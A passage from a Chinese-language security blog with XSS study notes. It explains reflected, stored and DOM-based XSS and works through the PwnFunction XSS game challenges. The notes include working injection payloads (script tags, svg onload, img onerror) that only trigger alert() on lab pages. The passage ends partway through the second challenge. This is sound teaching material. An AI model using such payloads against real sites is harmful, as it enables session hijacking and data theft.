        <time title="Modified: 2021-10-26 19:31:58" itemprop="dateModified" datetime="2021-10-26T19:31:58+08:00">2021-10-26</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="01-What-is-cross-site-scripting-XSS"><a href="#01-What-is-cross-site-scripting-XSS" class="headerlink" title="#01 What is cross-site scripting (XSS)?"></a>#01 What is cross-site scripting (XSS)?</h2><p>Cross-site scripting vulnerabilities normally allow an attacker to  masquerade as a victim user, to carry out any actions that the user is  able to perform, and to access any of the user’s data.</p>
<h2 id="02What-are-the-types-of-XSS-attacks"><a href="#02What-are-the-types-of-XSS-attacks" class="headerlink" title="#02What are the types of XSS attacks?"></a>#02What are the types of XSS attacks?</h2><ul>
<li>Reflected XSS, where the malicious script comes from the current HTTP request.</li>
<li>Stored XSS, where the malicious script comes from the website’s database.</li>
<li>DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.</li>
</ul>
<h3 id="01-Reflected-XSS"><a href="#01-Reflected-XSS" class="headerlink" title="##01 Reflected XSS"></a>##01 Reflected XSS</h3><h4 id="01-explain"><a href="#01-explain" class="headerlink" title="###01 explain"></a>###01 explain</h4><p>Reflected cross-site scripting (or XSS) arises when an application  receives data in an HTTP request and includes that data within the  immediate response in an unsafe way.        </p>
<p>举个栗子：</p>
<p>application的search function的url</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=gift        </span><br></pre></td></tr></table></figure>

<p>application收到请求之后的response</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: gift<span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>那么如果我search的参数是一段恶意js代码</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>response</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>里面的恶意代码就会执行。这就是反射型XSS。</p>
<p>为什么叫做反射型，是因为有一个反射的过程：</p>
<p>假如说attacker给victim发送了一个这样的连接</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>victim点击进去之后</p>
<p>过程①：url(包含恶意代码)发送到服务端</p>
<p>client——–&gt;&gt;&gt;恶意代码——&gt;&gt;&gt;server</p>
<p>过程②：服务端的response包含恶意代码，client接收到response，恶意代码在被执行。</p>
<p>servert——–&gt;&gt;&gt;恶意代码——&gt;&gt;&gt;client</p>
<p>所以是有一个反射的过程</p>
<h4 id="02-example"><a href="#02-example" class="headerlink" title="###02 example"></a>###02 example</h4><p>已知：search function有反射XSS漏洞</p>
<p>目标：call the <code>alert</code> function</p>
<p>search页面的源代码</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss1.png" alt="xss1"></p>
<p>搜索参数hat得到页面的源代码</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss2.png" alt="xss2"></p>
<p>所以我可以在参数部分注入js恶意代码</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss3.png" alt="xxe3"></p>
<p>注入成功！</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss4.png" alt="xss4"></p>
<p>查看页面源代码，search的内容被当作页面代码的一部分被执行。</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss5.png" alt="xss5"></p>
<h3 id="02-Stored-XSS"><a href="#02-Stored-XSS" class="headerlink" title="##02  Stored XSS"></a>##02  Stored XSS</h3><h4 id="01-explain-1"><a href="#01-explain-1" class="headerlink" title="###01 explain"></a>###01 explain</h4><p>Stored cross-site scripting (also known as second-order or persistent  XSS) arises when an application receives data from an untrusted source  and includes that data within its <strong>later</strong> HTTP responses in an unsafe way.        </p>
<p>举个栗子：</p>
<p>一个application允许user提交comment，提交后发出这样的post请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net </span><br></pre></td></tr></table></figure>

<p>在application的response中，显示comment的源码如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This post was extremely helpful.<span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>那么我在comment中如果提交恶意的js代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1337)<span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>在response中就会是</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1337)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br></pre></td></tr></table></figure>



<h4 id="02-example-1"><a href="#02-example-1" class="headerlink" title="###02 example"></a>###02 example</h4><p>已知：comment function有stored xss</p>
<p>目标：calls the <code>alert</code> function</p>
<p>查看comment function的页面源码，那么如果我comment注入js代码的话，看看情况如何</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss6.png" alt="xss6"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss7.png" alt="xss7"></p>
<p>可以看到js代码被成功执行了</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss8.png" alt="xss7"></p>
<p>从源码可以看出来comment被当作html代码的一部分被执行了</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss9.png" alt="xss7"></p>
<h3 id="03-DOM-XSS"><a href="#03-DOM-XSS" class="headerlink" title="##03 DOM XSS"></a>##03 DOM XSS</h3><h4 id="01-Exploiting-DOM-XSS-with-different-sources-and-sinks"><a href="#01-Exploiting-DOM-XSS-with-different-sources-and-sinks" class="headerlink" title="##01 Exploiting DOM XSS with different sources and sinks"></a>##01 Exploiting DOM XSS with different sources and sinks</h4><h5 id="001-source：location-search-sink：document-write"><a href="#001-source：location-search-sink：document-write" class="headerlink" title="###001  source：location.search         sink：document.write"></a>###001  source：location.search         sink：document.write</h5><p>已知：search query存在 DOM XSS漏洞</p>
<p>目标：calls the <code>alert</code> function.        </p>
<p>打开搜索页面，查看源码看到下面的内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trackSearch</span>(<span class="params">query</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+query+<span class="string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search)).get(<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">   trackSearch(query);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">解释一波：</span><br><span class="line">第一个函数trackSearch就是将搜索到query的图片的内容写入<span class="built_in">document</span>，表现出来。</span><br><span class="line">query怎么获取的呢？从URLSearchParams(<span class="built_in">window</span>.location.search)).get(<span class="string">&#x27;search&#x27;</span>)得到；从url中参数为search的value值中得到</span><br><span class="line">下面就是如果在url设置了search的值，就执行trackSearch函数。</span><br></pre></td></tr></table></figure>

<p>确定source和sink</p>
<p>source：其实就是search的值，window.location.search</p>
<p>sink：document.write</p>
<p>作为attacker，应该想办法如何对source下手，对其嵌入恶意代码。</p>
<p>来看一个查询实例：这里我给的search参数为hat</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss10.png" alt="xss10"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">参数：hat</span><br><span class="line">script:&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=hat&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对参数进行一些小改造</span><br><span class="line"></span><br><span class="line">参数：hat&quot;&gt;&lt;svg onload=&quot;alert(1337)</span><br><span class="line">说明：先用hat&quot;&gt;把前面img的tag给闭合掉。后面构造一个新的tag，引发alert，最后不需要闭合，由后端原本给img的闭合自动把这里闭合</span><br></pre></td></tr></table></figure>

<p>来看看改造之后的源码结果吧</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss11.png" alt="xss11"></p>
<p>成功了！</p>
<h5 id="002-source：location-search-sink：document-write【inside-a-select-element】"><a href="#002-source：location-search-sink：document-write【inside-a-select-element】" class="headerlink" title="###002 source：location.search         sink：document.write【inside a select element】"></a>###002 source：location.search         sink：document.write【inside a select element】</h5><p>已知：stock check存在 DOM XSS漏洞</p>
<p>目标：calls the <code>alert</code> function.    </p>
<p>老样子，先看源代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line">     <span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Paris&quot;</span>,<span class="string">&quot;Milan&quot;</span>];</span><br><span class="line">     <span class="keyword">var</span> store = (<span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search)).get(<span class="string">&#x27;storeId&#x27;</span>);</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span><br><span class="line">     <span class="keyword">if</span>(store) &#123;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;stores.length;i++) &#123;</span><br><span class="line">     <span class="keyword">if</span>(stores[i] === store) &#123;</span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line">分析一波代码：</span><br><span class="line">首先从url中search部分获取key=storeId的value赋值给store【(<span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search)).get(<span class="string">&#x27;storeId&#x27;</span>);】</span><br><span class="line">然后，构建select html代码。</span><br><span class="line">这里假设store的值为London，则接下来</span><br><span class="line">如果设置了store值【这里已经设置为London】，则将London的option设置为selected，被选中的那一个</span><br><span class="line">其它的stores中的内容，都设置一个option</span><br><span class="line">最后用&lt;/selected&gt;闭合</span><br><span class="line"></span><br><span class="line">ok，看到这里，大概知道代码的原意是什么了</span><br><span class="line">这里很明显 source是storeId（store）；那么sink呢？这里由好几个地方都有<span class="built_in">document</span>.write，肯定是和store相关的那个是sink，所以可以定位sink是<span class="keyword">if</span>(store) &#123;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">这一部分的<span class="built_in">document</span>.write</span><br></pre></td></tr></table></figure>



<p>构造source容易，因为storeId值可以在url设定。问题在于sink在option、select内部，但又不能在里面嵌入其它的tag。</p>
<p>所以只能先把select的内容给闭合。</p>
<p>所以可以这样构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">storeId=&lt;/select&gt;&lt;svg onload=&quot;alert(1337)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\xss14.png" alt="xss12"></p>
<p>成功注入！</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss12.png" alt="xss14"><img src="D:\blog\H01iday\source\_posts\pics\xss13.png" alt="xss13" style="zoom:67%;" /></p>
<h5 id="003-source：location-search-sink：innerHTML"><a href="#003-source：location-search-sink：innerHTML" class="headerlink" title="###003 source：location.search         sink：innerHTML"></a>###003 source：location.search         sink：innerHTML</h5><p>已知：search function有DOM XSS</p>
<p>目标：calls the <code>alert</code> function.        </p>
<p>说明：on any modern browser, innerHTML sink不接受script和svg onload这些element</p>
<p>对应innerHTML 只能用img/iframe元素</p>
<p>老样子，上代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">doSearchQuery</span>(<span class="params">query</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;searchMessage&#x27;</span>).innerHTML = query;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> query = (<span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search)).get(<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(query) &#123;</span><br><span class="line">    	doSearchQuery(query);</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">解释一波代码：</span><br><span class="line">首先query为url中的key为search的value</span><br><span class="line">doSearchQuery函数的作用：将id为searchMessage的innerHTML设置为query</span><br></pre></td></tr></table></figure>



<p>看一个例子：</p>
<p>我在搜索框搜索hat</p>
<p>即search的value为hat</p>
<p>下面代码可以看到将searchMessage的innerHTML设置为hat</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss15.png" alt="xss15"></p>
<p>这里可以分析出来： source为search的value  【query】</p>
<p>​                                    sink为id为searchMessage的span tag 的innerHTML</p>
<p>因为sink是innerHTML 所以注意不能使用script或者svg onload进行注入</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss16.png" alt="xss16"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss17.png" alt="xss17"></p>
<p>成功执行！</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/14/XSS%20game/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/14/XSS%20game/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-14 15:16:23" itemprop="dateCreated datePublished" datetime="2021-09-14T15:16:23+08:00">2021-09-14</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-04 20:13:46" itemprop="dateModified" datetime="2021-10-04T20:13:46+08:00">2021-10-04</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="1-Ma-Spaghet"><a href="#1-Ma-Spaghet" class="headerlink" title="1.Ma Spaghet!"></a>1.Ma Spaghet!</h1><p>Hope for the best，prepare for the worst</p>
<ul>
<li>Difficulty is <strong>Easy</strong>.</li>
<li><strong>Pop an <code>alert(1337)</code></strong> on <code>https://sandbox.pwnfunction.com/warmups/ma-spaghet.html</code>.</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;spaghet&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    spaghet.innerHTML = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;somebody&#x27;</span>) || <span class="string">&quot;Somebody&quot;</span>) + <span class="string">&quot; Toucha Ma Spaghet!&quot;</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="知识清单："><a href="#知识清单：" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
<li>URL(location).searchParams.get</li>
</ol>
<p>​    例子：如果URL 是 <code>https://example.com/?name=Jonathan%20Smith&amp;age=18</code> ，你可以这样解析 URL，然后得到 <code>name</code> 和 <code>age</code> 的值。</p>
<p>如果没有对应的键，返回null。如params.get(‘address’) 返回的是null</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> params = (<span class="keyword">new</span> URL(<span class="built_in">document</span>.location)).searchParams;</span><br><span class="line"><span class="keyword">let</span> name = params.get(<span class="string">&#x27;name&#x27;</span>); <span class="comment">// is the string &quot;Jonathan Smith&quot;.</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="built_in">parseInt</span>(params.get(<span class="string">&#x27;age&#x27;</span>)); <span class="comment">// is the number 18</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>HTML的onload事件</p>
<p>页面加载之后立即执行一段 JavaScript</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">onload</span>=<span class="string">&quot;script&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>HTML的onerror事件</p>
<p>如果加载图像时发生错误，则执行 JavaScript（onerror中就是要执行的js代码）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;image.gif&quot;</span> onerror=<span class="string">&quot;myFunction()&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>有了上面的储备知识就可以解读一下这个代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;spaghet&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    spaghet.innerHTML = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;somebody&#x27;</span>) || <span class="string">&quot;Somebody&quot;</span>) + <span class="string">&quot; Toucha Ma Spaghet!&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//首先是从URL中获取名为somebody的参数的值</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//如果没有名为somebody的参数，即get函数返回null的话就使用&quot;Somebody&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//再将该值和&quot; Toucha Ma Spaghet!&quot;拼接起来</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//作为&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;的innerHTML</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>思路：将可以执行javascript代码alert(1337)的内容，作为参数somebody的值。</p>
</li>
</ol>
<h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><ol>
<li><p>在url加入参数 somebody=&lt;svg onload=”alert(1337);”&gt;</p>
<p>一开始：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html</span><br></pre></td></tr></table></figure>

<img src="D:\blog\H01iday\source\_posts\pics\xss game1.png" alt="xss game1" style="zoom:67%;" />

<p>![xss game2](D:\blog\H01iday\source_posts\pics\xss game2.png)</p>
<p>加入后：</p>
<p>此时的url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=&lt;svg onload=&quot;alert(1337);&quot;&gt;  //unencoded</span><br><span class="line"></span><br><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg%20onload=%22alert(1337);%22%3E  //encoded</span><br></pre></td></tr></table></figure>

<img src="D:\blog\H01iday\source\_posts\pics\xss game3.png" alt="xss game3" style="zoom:67%;" />

<p>此时的代码【我认为，这也是注入的一种，用户输入的内容被解析为js代码，并能够被执行】</p>
<p><img src="file:///C:\Users\86176\AppData\Roaming\Tencent\Users\1970869031\QQ\WinTemp\RichOle\DJF2D8SL[JUCAGC`2MLGN45.png" alt="img"></p>
</li>
<li><p>在url中加入参数somebody=&lt;img src=”whatever” onerror=”alert(1337);”&gt;</p>
<p>和方法1本质是一样的，不同在于调用javascript的方法不一样。方法1是使用onload的特性，而方法2是利用加载图片产生错误onerror可以调用javascript的特性罢了。</p>
<p>因为我填写的src(图片路径)是乱填的，只要找不到对应的图片就会引发onerror的调用。</p>
<p>查看此时的代码</p>
<p>![xss game4](D:\blog\H01iday\source_posts\pics\xss game4.png)</p>
<p>【如果是插入恶意代码到html的innerhtml中，直接插入&lt;svg onload&gt; 或者&lt;img onerror&gt;即可】</p>
</li>
</ol>
<h1 id="2-Jefff"><a href="#2-Jefff" class="headerlink" title="2.Jefff"></a>2.Jefff</h1><ul>
<li>Difficulty is <strong>Easy</strong>.</li>
<li><strong>Pop an <code>alert(1337)</code></strong> on <code>https://sandbox.pwnfunction.com/warmups/jefff.html</code>.</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;maname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> jeff = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;jeff&#x27;</span>) || <span class="string">&quot;JEFFF&quot;</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> ma = <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">eval</span>(<span class="string">`ma = &quot;Ma name <span class="subst">$&#123;jeff&#125;</span>&quot;`</span>)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        maname.innerText = ma</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="知识清单：-1"><a href="#知识清单：-1" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
<li><p><code>eval()</code> 函数会将传入的字符串当做 JavaScript 代码进行执行。</p>
<p>例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="string">&#x27;2 + 2&#x27;</span>));</span><br><span class="line"><span class="comment">// expected output: 4</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;2 + 2&#x27;</span>)));</span><br><span class="line"><span class="comment">// expected output: 2 + 2</span></span><br></pre></td></tr></table></figure></li>
<li><p>**<code>setTimeout()</code>**方法设置一个定时器，该定时器在定时器到期后执行一个函数或指定的一段代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var timeoutID = scope.setTimeout(function[, delay, arg1, arg2, ...]);</span><br><span class="line">var timeoutID = scope.setTimeout(function[, delay]);</span><br><span class="line">var timeoutID = scope.setTimeout(code[, delay]);</span><br></pre></td></tr></table></figure>

<p>delay：单位毫秒，在delay毫秒后执行function/code</p>
<p>arg1,…,argn：传递给function的参数</p>
</li>
<li><p>关于Javascript中字符串减法运算</p>
<p>如果字符里为纯数字，转化为数字类型进行运算</p>
<p>如果字符中不是纯数字，结果出现NaN</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i,j,a,b;</span><br><span class="line">	i = <span class="string">&quot;3&quot;</span>;</span><br><span class="line">	j = <span class="string">&quot;4&quot;</span>;</span><br><span class="line">	a = j-i;</span><br><span class="line">	alert(a);</span><br><span class="line">》》<span class="number">1</span></span><br><span class="line">	i1 = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">	j1 = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">	b = j1-i1;</span><br><span class="line">	alert(b);</span><br><span class="line">》》<span class="literal">NaN</span></span><br></pre></td></tr></table></figure>

<p>如果是加法，不管是不是数字都是两个字符串连接起来</p>
